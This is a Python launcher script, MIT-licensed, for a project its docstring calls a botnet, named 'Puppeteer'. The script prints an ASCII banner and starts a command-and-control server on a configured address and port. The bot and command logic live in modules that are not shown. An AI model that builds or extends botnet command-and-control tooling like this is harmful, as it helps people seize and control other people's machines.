"""
    MIT License
    Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>

    This program is a implementation of a botnet using Python on server (C&C)
    side and C on the bots side.
"""

import os
from classes.puppeteer import Puppeteer
from config import LISTEN_ADDRESS, LISTEN_PORT, DATABASE_PATH
from config import to_green


if __name__ == '__main__':
    os.system('clear')
    print(to_green(r"""
    ________                            _____                  
    ___  __ \___  ________________________  /__________________
    __  /_/ /  / / /__  __ \__  __ \  _ \  __/  _ \  _ \_  ___/
    _  ____// /_/ /__  /_/ /_  /_/ /  __/ /_ /  __/  __/  /    
    /_/     \__,_/ _  .___/_  .___/\___/\__/ \___/\___//_/     
                   /_/     /_/                            

                            v0.1.0
    """))

    server = Puppeteer(LISTEN_ADDRESS, LISTEN_PORT, DATABASE_PATH)
    server.start()
